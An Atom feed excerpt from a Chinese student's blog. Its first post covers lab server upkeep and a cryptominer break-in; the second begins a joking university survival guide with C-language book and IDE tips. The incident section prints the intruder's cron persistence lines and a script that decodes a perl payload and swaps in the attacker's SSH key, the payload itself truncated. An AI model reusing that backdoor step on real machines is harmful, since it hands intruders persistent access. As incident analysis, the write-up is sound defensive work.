bash 4.3.48      .:+o:+o&#x2F;.          &#96;+sssoo+&#x2F;    WM: Not Found .++&#x2F;+:+oo+o:&#96;             &#x2F;sssooo.   CPU: Intel Xeon CPU E5-2630 v4 @ 3.1GHz&#x2F;+++&#x2F;&#x2F;+:&#96;oo+o               &#x2F;::--:.   RAM: 1348MiB &#x2F; 32074MiB\+&#x2F;+o+++&#96;o++o               ++&#x2F;&#x2F;&#x2F;&#x2F;. .++.o+++oo+:&#96;             &#x2F;dddhhh.      .+.o+oo:.          &#96;oddhhhh+       \+.++o+o&#96;&#96;-&#96;&#96;&#96;&#96;.:ohdhhhhh+        &#96;:o+++ &#96;ohhhhhhhhyo++os:          .o:&#96;.syhhhhhhh&#x2F;.oo++o&#96;              &#x2F;osyyyyyyo++ooo+++&#x2F;                  &#96;&#96;&#96;&#96;&#96; +oo+++o\:                         &#96;oo++.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="更新">更新</h2><p>发现不是镜像源的问题，是你电的镜像源没安排上https，这个服务器好像是证书的问题，https全都用不了，wget也不行。</p><h2 id="滚动升级">滚动升级</h2><p>不存在的，这又不是arch系，不要乱升，乱升级滚挂了是要背锅的 要升可以用</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> do-release-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>升完记得把apt源给换了 看到有安全更新，说 &gt;<strong><em>System restart required</em></strong></p><p>reboot一下就行了</p><h2 id="网络问题">网络问题</h2><h3 id="网很慢">网很慢</h3><p>很迷，有的地方很快，有的地方就几乎慢到断线。我的联通就经常ping不同。 据说老蔡师兄他那里也经常ping不通</p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ping-ubuntu.jpg" alt="Picture" style="zoom:60%;" /></p><p>就是网不好。。。而且上行网速更差，有的时候只有100k/s（用的是一个月20块的基础套餐，没加钱）</p><pre class="line-numbers language-none"><code class="language-none">Testing download speed..................................Download: 11.72 Mbyte&#x2F;sTesting upload speed....................................Upload: 2.45 Mbyte&#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="掉线">掉线</h3><p>受疫情影响，全教研室在家连服务器，但是服务器的网络还总掉线 跑一个自动重启网络服务的脚本，直接抄<span class="exturl" data-url="aHR0cDovL3d3dy5saXV4aWFvLm9yZy8yMDE5LzA4L3VidW50dS3kuIvnm5Hmjqflubboh6rliqjph43lkK/nvZHljaEv">这里<i class="fa fa-external-link-alt"></i></span></p><h2 id="备份和恢复">备份和恢复</h2><p>师兄也没装什么东西，用的cp直接备份了点文件，一言不合重装系统。 先暂时用cp备份一次 挂载一下盘(比如挂到/mnt/mydata)，用cp复制 (挂载看这里<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mount</span> /dev/sdb7 /mnt<span class="token function">nohup</span> <span class="token function">cp</span> -pdr /srv /mnt/mydata <span class="token operator">>></span> logs.out <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span class="token function">umount</span> /dev/sdb7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样将/srv目录下的文件全部拷贝到mydata下面. 文件很大，cp没有进度条，以后试试gcp之类的命令，先这样吧</p><p>看了一下，有接近300G的数据，用cp命令太慢了 用dd，把,整盘拷贝（dd命令不要乱用，一不小心就删库了）</p><p>拷贝完<code>umount /mydata</code>再拔</p><p>下次试试rsync同步，据说能断点续传和md5验证</p><p>更新，发现一款叫clonezilla的软件，使用clonezilla备份非常方便。</p><h2 id="使用教研室服务器下载">使用教研室服务器下载</h2><p>教研室的服务器有一个单独的猫和ip，网速绝大多数时候不低于50M/s，今天才发现比我的小破工位上的网速快不少。 以后下数据集和数据库文件之类的大东西就用它了！</p><h2 id="使用tmux">使用Tmux</h2><p>（其实MobaXterm有一个叫Multiexec的功能） 正在备份文件结果网断了（没办法，校园网就是这么....） 这时就要用tmux之类的工具了</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> tmux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="图形界面">图形界面</h2><p>MobaXterm内嵌有Xserver，可以调出图形化窗口。 比如nedit,Emacs之类的 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/xserver.png" alt="Picture" style="zoom:80%;" /> 已经足够应付简单的图形化界面需求了 完整的桌面需求请直接VNC或teamviewer到工作站操作。</p><h2 id="卸载遗留的docker并重装">卸载遗留的Docker并重装</h2><p>目前还报这样的错</p><pre class="line-numbers language-log" data-language="log"><code class="language-log">Cannot connect to the Docker daemon at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock. Is the docker daemon running?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>似乎重装iptables的时候会直接把那个Docker的一部分依赖卸掉 （Docker好像还会直接修改默认的防火墙规则，emmmm)</p><p>更新，解决了，是网络问题，离线装就好了</p><h2 id="教研室的阿里云">教研室的阿里云</h2><p>真的，有毒哇 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/apt.png" alt="Picture" style="zoom:80%;" /> 是的，师兄跟我说没有apt。。。<strong>行吧</strong></p><p>装一个</p><p>等等，不对劲，这是Centos啊</p><p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/centos.png" alt="Picture" style="zoom:80%;" /></p><p>行吧...........那没事了。师兄真的.....我感觉我上了贼船</p><h2 id="报备">报备</h2><p>按学校信息中心的要求，固定IP都需要申请报备，还有一堆乱七八糟的事</p><h3 id="系统日志和杀毒">系统日志和杀毒</h3><p>学校信息中心要求备份系统日志和杀软。 然而这Linux有什么装杀软的必要吗？防火墙就完事了。 行吧，交差还是要装模做样的应付一下</p><p>安装ClamAV：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> clamav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接扫描报错了，要升级病毒库<code>sudo freshclam</code></p><pre class="line-numbers language-log" data-language="log"><code class="language-log">LibClamAV Error: cli_loaddbdir(): No supported database files found in &#x2F;var&#x2F;lib&#x2F;clamavERROR: Can&#39;t open file or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r -i /  <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>系统安装日志，不知道要交什么，索性把apt和dpkg的日志交了,在<code>/var/log/</code>和<code>/var/log/apt/</code>目录下面</p><h3 id="端口报备">端口报备</h3><p>一般22，80，443，再加上几个常用的端口就够了 实在不行还有端口转发</p><p>看一下开了的端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -znv <span class="token number">211</span>.XXX.XXX.XXX <span class="token number">1</span>-10000  <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> succeeded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="域名">域名</h3><p>暂时还没有，备案麻烦没弄</p><h2 id="清理trash">清理Trash</h2><p>工作站桌面变得非常卡，clamscan扫描home目录也扫了整整两天，看了一下发现有前前任师兄几百个G的数据。使用rm之后跑到了.local文件夹下。使用跑路命令把它们删掉。(最好不要把 .local全删了，只删Trash就行了<code>.local/share/Trash</code>)</p><h2 id="其他">其他</h2><p>Gitlab占用过高的问题等见瞎折腾记录(其实没有特殊需求可以用Gogs，小声逼逼) 在服务器上部署jupyter参考<span class="exturl" data-url="aHR0cHM6Ly9iaXRtaW5ndy5jb20vMjAxNy8wNy8wOS9ydW4tanVweXRlci1ub3RlYm9vay1zZXJ2ZXIv">搭建 ipython/jupyter notebook 服务器<i class="fa fa-external-link-alt"></i></span></p><h2 id="远程开发">远程开发</h2><p>为什么要远程呢，因为我的电脑是小破i5，8G内存，装双系统不太行，虚拟机更不行。用wsl真的不如直接上服务器20核CPU、工作站两块1080pi（还有单独的网线和公网IP）。配合SSH端口转发和VSCode、JB全家桶，还是很舒服的。</p><h2 id="部署项目">部署项目</h2><h3 id="标注工具doccano">标注工具doccano</h3><p>这里以开源标注工具doccano为例（该项目提供了Docker镜像和直接部署的方法以及docker-compose示例文件，还给了aws等一键部署脚本）</p><p>我们clone下来，修改settings.py文件</p><p>最简单的方法就是直接上docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/doccano/doccano.git$ <span class="token builtin class-name">cd</span> doccano$ docker-compose -f docker-compose.prod.yml up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>docker打包通常会很大，动不动就上G了，一些轻量且不至于弄坏系统环境的东西建议还是裸跑</p><h2 id="一次被黑记录">一次被黑记录</h2><pre class="line-numbers language-log" data-language="log"><code class="language-log">CPU  [||||||||||||||||                 51.8%]   CPU -    51.8%  nice:     0.0%  ctx_sw:    8K   MEM -   21.7%  active:    5.31G   SWAP -    0.0%   LOAD    20-coreMEM  [|||||||                          21.7%]   user:    51.3%  irq:      0.0%  inter:   5508   total:  31.3G  inactive:  4.27G   total:    976M  ····lo                         0b     0b   999.5  0.0   2.34G 2.44M   2654 root        67h8:58 16    0 S    ? ?    .&#x2F;cron2020-01-15 16:17:54 CST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>症状：昨天（2020.1.14）root上不去了，rsa密钥也挂了，以为是网的问题，今天一试还不行。用自己的另一个账号登了一下，发现<code>su root</code>居然permission denied了。怀疑是被黑了，一看系统占用，有挖矿程序在跑，而且网络带宽占用也很高，怀疑是被当成肉鸡对外攻击了。看了一下系统日志，是一月13号被黑的，照着网上清了一遍。从此禁用密码登录（之前就想禁，师兄嫌麻烦）。MySQL也禁用密码改ssl</p><p>clamav再扫一遍</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r /root <span class="token number">2</span> <span class="token operator">>></span> err.out <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新：</p><p>之前没清干净，貌似又被黑了</p><p>症状，运行<code>apt update</code>的时候</p><pre class="line-numbers language-none"><code class="language-none">Errors were encountered while processing: clamav-freshclam clamavE: Sub-process &#x2F;usr&#x2F;bin&#x2F;dpkg returned an error code (1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然而运行了一下freshclam</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@xi102:~<span class="token comment"># freshclam</span>Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> ClamAV update process started at Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span>Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> daily.cld database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">25743</span>, sigs: <span class="token number">2209759</span>, f-level: <span class="token number">63</span>, builder: raynman<span class="token punctuation">)</span>Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> main.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">59</span>, sigs: <span class="token number">4564902</span>, f-level: <span class="token number">60</span>, builder: sigmgr<span class="token punctuation">)</span>Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> bytecode.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">331</span>, sigs: <span class="token number">94</span>, f-level: <span class="token number">63</span>, builder: anvilleg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>居然显示病毒库是最新的</p><p>可疑进程 /opt/atlassian/confluence/jre//bin/java -Djava.ut</p><p>然后看了一下有没有可疑的定时任务</p><pre class="line-numbers language-none"><code class="language-none">root@xi102:~# crontab -l0 0 *&#x2F;3 * * &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1@reboot &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;15 8 * * 0 &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1@reboot &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;10 0 *&#x2F;3 * * &#x2F;tmp&#x2F;.X19-unix&#x2F;.rsync&#x2F;c&#x2F;aptitude&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那个tmp下面有的时候是<code>0 0 */3 * * /tmp/.X21-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</code></p><p>这个<code>.X某某-unix</code>应该是想伪装成<code>.X11-unix</code>X11转发的临时文件</p><p>root@xi102:~/.bashtemp# ps aux | grep cron root 140526 0.0 0.0 12944 1028 pts/1 S+ 17:16 0:00 grep --color=auto cron</p><p>看了一下这个目录下面，有鬼，应该就是它了</p><pre class="line-numbers language-none"><code class="language-none">root@xi102:~&#x2F;.bashtemp# lsa  b  cron.d  dir2.dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>谷歌随手一搜这个.bashtemp，全都是被挖矿的被黑的，先干掉再说 http://blog.itpub.net/31559758/viewspace-2667801/ https://www.anquanke.com/post/id/197662 更新，又看到几个的 http://m.lanhusoft.com/Article/745.html https://yulijia.net/cn/操作系统/2020/03/03/Trojan-attack-analysis.html#fn:2 把这个文件夹拉下来，可以看到里面有个run文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">nohup</span> ./stop<span class="token operator">>></span>/dev/null <span class="token operator">&amp;</span><span class="token function">sleep</span> <span class="token number">5</span><span class="token builtin class-name">echo</span> <span class="token string">"ZXZhbCB1bnBh....这里太长略过..."</span> <span class="token operator">|</span> base64 --decode <span class="token operator">|</span> perl<span class="token builtin class-name">cd</span> ~ <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .ssh <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"ssh-rsa AAAAB3N...这里一段密钥太长略过...fckr"</span><span class="token operator">>></span>.ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> -R <span class="token assign-left variable">go</span><span class="token operator">=</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的rsa密钥和那一串base64编码的perl脚本太长，单独放出来</p><p>rsa：</p><pre class="line-numbers language-none"><code class="language-none">AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2&#x2F;9p7+vD0EpZ3Tz&#x2F;+0kX34uAx1RV&#x2F;75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw&#x3D;&#x3D; mdrfckr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>perl脚本（base64解码之后）：</p><pre class="line-numbers language-none"><code class="language-none">eval unpack u&#x3D;&gt;q&#123;_&quot;FUY(...中间这一段还是太长略过...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用perl的unpack把后面那一段解包之后还是有900多行，太长了，放到Github gist上了<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a> (按照挖矿佬的风俗是不是应该放到pastebin上？)</p><p>我上面放的那两篇文章里的情况和这个几乎一样。大概就是先运行一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRyZW5kbWljcm8uY29tL3RyZW5kbGFicy1zZWN1cml0eS1pbnRlbGxpZ2VuY2Uvb3V0bGF3LWhhY2tpbmctZ3JvdXBzLWJvdG5ldC1vYnNlcnZlZC1zcHJlYWRpbmctbWluZXItcGVybC1iYXNlZC1iYWNrZG9vci8=">perl的脚本<i class="fa fa-external-link-alt"></i></span>，然后把你的SSH密钥删了，插入它的后门密钥。进程伪装成rsync之类的东西。运行后会在<code>\tmp\</code>下面产生一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5qdW5pcGVyLm5ldC9lbi11cy90aHJlYXQtcmVzZWFyY2gvZG90YTMtaXMteW91ci1pbnRlcm5ldC1vZi10aGluZ3MtZGV2aWNlLW1vb25saWdodGluZw==">dota3文件<i class="fa fa-external-link-alt"></i></span></p><p>看到了一个可疑的欧洲IP：45.9.148.125 和一个可疑的网站：www.minpop.com</p><h3 id="后续清理工作">后续清理工作</h3><p>干掉定时任务<code>crontab -e</code>,把上面那几条定时任务全删了 删除<code>~/.ssh</code>目录底下可疑的authorized_keys 删除定时任务中的可疑文件夹<code>.bashtemp</code>和<code>.X21-unix</code></p><h2 id="注">注</h2><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9pc2lzdGVyLmNjL3Bvc3RzL0ZhaWwyYmFuLUJhc2lj">使用 Fail2Ban 加固你的 Linux 服务器<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS51YnVudHUub3JnLmNuL3ZpZXd0b3BpYy5waHA/Zj0xMjAmYW1wO3Q9MjU3MzMz">细说linux挂载——mount，及其他……<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vQXJjaGFlb3JhcHRvci8wN2RjM2RmZTc0MWEyYzMzMmJmYWRkZWU3ZTk1YjVkOA==">完整的perl脚本<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></section>]]></content>
    
    
    <summary type="html">&lt;p&gt;教研室要倒闭啦，师兄毕业跑路啦！</summary>
    
    
    
    <category term="102网吧日常" scheme="https://zhangjk98.xyz/categories/102%E7%BD%91%E5%90%A7%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="https://zhangjk98.xyz/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>清水寺生存指北</title>
    <link href="https://zhangjk98.xyz/40f3/"/>
    <id>https://zhangjk98.xyz/40f3/</id>
    <published>2019-11-03T03:25:11.000Z</published>
    <updated>2019-11-03T03:25:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>你说我一个渣渣，硬件不精，软件不熟，边缘学院，劝退专业，没有国奖，没有论文，现在刚大四保完研都还没毕业，怎么就有脸来写生存指北了呢？ <a id="more"></a></p><p>当年看到上交的那个上海交通大学生存手册，还是在大一。三年一晃而过，现在再看，我是笑不出来，我眼泪在肚子里流。</p><p>国内理工科都有不少相似的问题，我感觉至少有七成问题是相似的（上交的那份生存指南也有十年了，只有小部分政策变化，大部分情况几乎没怎么变，放在今天依然是合适的）。但是每个学校都需要一个生存指南，剩下的三成大一新生是不太容易从报喜不报忧的学校官方账号、各怀鬼胎的老师、辅导员、坑蒙拐骗装腔作势狐假虎威的学长学姐那里打听到的。</p><p>看到大一大二的一些同学年复一年在走弯路，于心不忍，还是写点东西，罢了。</p><h2 id="写在前面的话">写在前面的话</h2><ul><li>大佬就不用看了，出门右转去打电赛/ACM/科研</li><li>出国的同学也不用看了，出门左转河畔《成电飞跃手册》（现在的国际形势，想出国的同学不推荐来在实体清单上的你电）</li><li>本文不具有时效性，大新闻实时放送看这里<span class="exturl" data-url="aHR0cHM6Ly91ZXN0Yy5pY3Uv">UESTC.icu<i class="fa fa-external-link-alt"></i></span></li></ul><h2 id="成电笑话">成电笑话</h2><ul><li><p>建校初年，苏联援建，师承苏系（看到那个苏式主楼了吗），笑话当然也一脉相承啦。</p></li><li><p>一个川农的男生，一个西交的男生，一个川大的男生和一个成电的男生一起去请教一一个西财的男生怎么找女朋友。西财的说:“很简单，邀请你喜欢的女生，在周末到市里逛逛，买点礼物，请她吃饭，久而久之她就对你有好感了。”川大的问: "什么是周末?”西交的问:“什么是女生?”川农的问:“什么是市里？” 成电的问：“什么是周末？什么是女生？什么是市里？”</p></li><li><p>“同学，请问您在支持课程改革方面动摇过🐴” “我和课程改革一起动摇”</p></li><li><p>“拉宾诺维奇，你关注成电新闻吗” “当然，不然我怎么知道我们在课程改革”</p></li><li><p>问：教育改革和科学有什么区别？ “如果教育改革是科学的，那他们应该先拿成教学生当小白鼠”</p></li><li><p>校领导：“我们要教育改革，培养条理清晰地写作和连贯的表达能力！” 同学们：“太好了，那要怎么做呢” 教务处：“增加马原毛概思修的课时和考试要求，开卷全部改为闭卷”</p></li><li><p>教务处：我们要进行教育改革，请大家在 指 定 时 间 之内将您的宝贵意见、建议反馈至教务处。 （温馨提醒，文件尚未正式发布，请勿外传） 全校师生：什么时候? 教务处：10 全校师生：10什么？10个月？还是10天? 教务处：9，8，7......</p></li></ul><h2 id="一入ee深似海条条大路转cs">一入EE深似海，条条大路转CS</h2><p>你电的专业设置非常繁杂，吹的天花乱坠，但是我觉得可以全砍了（尤其是什么光电、生医，国内既没有足够的工作岗位，也不像数学那样出来转行也不会太废），就把工科的本科设置并成EE/CS。当然了，现在EE八成也是打算转CS的（10年前并不是这样，通信很火，土木很火，计算机冷淡，搞计算机视觉和自然语言处理就业惨淡） 没办法，16年后成都房价经历了限购等几波上涨，留给大家的选择不多了，要恰饭的嘛 （家里有矿请随意） 我知道很多同学心怀梦想，但是四年后基本都出国/读研/考公、教师</p><h2 id="上课">上课</h2><h3 id="学会水课">学会水课</h3><blockquote><p><strong>天变不足惧，人言不足恤，祖宗之法不足守</strong></p></blockquote><p>你电有很多课，就是在拿着N年以前的课本/PPT浪费学生的生命。<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>要是真傻不拉几地上课跟着老师听，三年时间基本就废了 另外，你电很多老师的水平（这里仅仅指教的课相关领域水平），并不比学完这门课的你高</p><p>当你很喜欢一门选修课/老师但是给分低/考试难，不选，旁听</p><p>当你遇到一门水课，水</p><p>当你遇到一门课不水，但是对你没用/老师不好，水</p><p>当你遇到一门课不水，老师挺好，但是对你以后工作/出国没用，水</p><h3 id="c语言">C语言</h3><p>大一大多数学院都要学C语言，但是基本都用的谭浩强（计院用的自编教材，约等于魔改版谭浩强；格院用的C Primer Plus）。大部分任课老师的水平嘛，你懂的。我大一还在用VC6，不知现在怎样了，貌似已经换成vs2010那些，完 美 对 标 计 算 机 二 级。</p><p>如果搞硬件，C51、stm32、其他的嵌入式板子，C是很重要的，以后就算转软，学好C打底也是很重要的。但是大多数老师只讲些语法和循环以及++++i++++之类的鬼才操作，指针啊内存啊都不好好讲的（也可能是课时太少，来不及讲）</p><p>下面这些是我班主任c老师（<del>什么？班主任？别问我为什么你电一所大学居然还有班主任，你电就是这么没天理，忍了吧</del>）班会的时候说他要教大一C语言了，问我有什么建议，我就写了下面这些给他。额，偶滴班主任是搞生物心理学实验之类的，也做过一点脑电采集电路，可能10年没自己写过C了，水平你懂的。对了，他上学期还被强行指派去教一门Unix操作系统的课，他之前还给我们上过精密仪器和生物心理学实验；水平嘛，嗯，这水平问题好像也不怪他。（<del>什么？他为什么要教这么多课？没办法，他是苦逼的讲师，那些大教授忙于捞钱，又不愿意给我们上课。虽然学校规定教授必须上课，实际上嘛，比如某y院长，挂个名，扔给别的老师</del>）</p><p>扯多了，下面是当时应班主任邀请写给大一新生的建议。 老师很虚心听取建议的，我还是成功劝退了你电SM学院一半新生使用谭浩强和VS2010，改用k&amp;r，善哉，善哉。 (教材质量赶超计院和格院一刚！)</p><h4 id="书籍推荐">书籍推荐</h4><h5 id="c程序设计语言">《C程序设计语言》</h5><p>The C Programming Language, C语言之父写的，豆瓣和亚马逊评分最高的一本。习题也很经典, 有一本配套的习题解答。github上也有很多习题解答，比如<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NjcGFsZXR0ZXMvdGhlLWMtcHJvZ3JhbW1pbmctbGFuZ3VhZ2Utc2Vjb25kLWVkaXRpb24tc29sdXRpb25z">ccpalettes/the-c-programming-language-second-edition-solutions<i class="fa fa-external-link-alt"></i></span></p><h5 id="c-primer-plus"><span class="exturl" data-url="aHR0cHM6Ly9ib29rLmRvdWJhbi5jb20vc3ViamVjdC8xMjQwMDAyLw==">C Primer Plus<i class="fa fa-external-link-alt"></i></span></h5><p>格拉斯哥学院在用的教材，但是非常详细（啰嗦）</p><h5 id="c语言入门更简单的书籍"><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xOTY5NDgyMw==">C语言入门更简单的书籍<i class="fa fa-external-link-alt"></i></span></h5><p>这个文章里有适合入门的几本书,比k&amp;r那本更简单一点</p><h5 id="c专家编程c陷阱与指针等">C专家编程、C陷阱与指针等</h5><p>适合进阶阅读，大一课多</p><h5 id="如果还是要用谭浩强">如果还是要用谭浩强</h5><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcnRpbnd1NDIvZmstdGhx">https://github.com/martinwu42/fk-thq<i class="fa fa-external-link-alt"></i></span></p><p>哪本书好这种问题, 我建议去图书馆翻一下看看,不同人适合不同风格,找一本适合自己的</p><h4 id="编程环境">编程环境</h4><p>这种问题见仁见智,一般有IDE（integrated development enviroment）和命令行记事本两种选择。只是上课IDE就够了，真想学好c，建议类unix环境下学习，linux/wsl+命令行+vim/VScode，IDE虽好，不要过于依赖<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDE2OTgyNw==">什么都帮你做了一键运行会让你忽略很多底层的东西<i class="fa fa-external-link-alt"></i></span></p><p>学习c语言的时候参照官方通用的c99/c98/c11标准, 差别也不太大,编译器的选择clang或gcc都行,对于初学者而言初学者较少涉及系统和底层,差别也不大(clang可能对初学者更友好些)</p><h5 id="vs2010vc2010">vs2010、vc2010</h5><p>成电计算机学院上机考试用的vs2010，c语言计算机二级考试用的vc2010。 但是作为ide，现在（2019年）非常古老，功能远不如vs2019。而且正版是收费的。 (虽然有破解版，但这两个老软件在win7和win10上兼容问题非常多。)</p><h5 id="codeblocks">codeblocks</h5><p>vs系列都过于臃肿，初学者只是学个c语言用这个几乎就是杀鸡用牛刀，<strong>codeblocks</strong>是非常好的一款开源IDE。不少ACM选手都用这个,很多人刷leetcode也用这个。配置省心，功能够用，简单粗暴，还免费，支持标准的c/c++语法。（唯一的缺点就是丑）最适合不想在配置和新建工程以及兼容问题上折腾的初学者。<strong>c-free</strong> 也行。</p><h5 id="vscode">VSCode</h5><p>这几年很火的微软家开源编辑器<strong>VSCode</strong>，是<em>宇宙第一IDE的亲儿子</em>，颜值比codoblock和vc6.0高到不知哪里去了，虽然本质还是个atom那样的notepad，但配置也不麻烦，装个插件也能像IDE那样一键运行(不过还是推荐你试试命令行)。这种现代编辑器比vim对新手有好多了</p><h5 id="vs2019vs2017vs2015">vs2019/vs2017/vs2015</h5><p>微软家的<em>宇宙第一IDE</em>，不多解释。而且vs2017 community版免费，功能完全够初学者使用。一个问题是臃肿（也就十几个G吧），另一个问题是<em>vs2017以后不完全支持c99</em>，配置起来很麻烦，不建议c语言初学者使用,适合c++开发！（<em>不写上万行的c++项目就别用宇宙第一IDE了</em>）</p><h5 id="clion">clion</h5><p>Mac和16G以上内存win/linux系统下强烈推荐clang+<strong>clion</strong>，Jetbrains全家桶真香，有教育优惠，学生免费。跟微软的vs不相上下，而且对c的支持非常好! 但是很吃内存，配置不好就别用了</p><h5 id="vim">vim</h5><p>clang/gcc/mingw + 命令行 + VSCode/sublime/notepad++ /vim喜爱折腾的同学可以尝试.跨平台开发请试试cmake</p><h4 id="其他">其他</h4><p>多动手, 多调试, 不会问谷歌, 编程要多练习,不然会变成<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyNjU2MjExMy9hbnN3ZXIvNzE0MDMzNzk4">计算机报告文学<i class="fa fa-external-link-alt"></i></span></p><h3 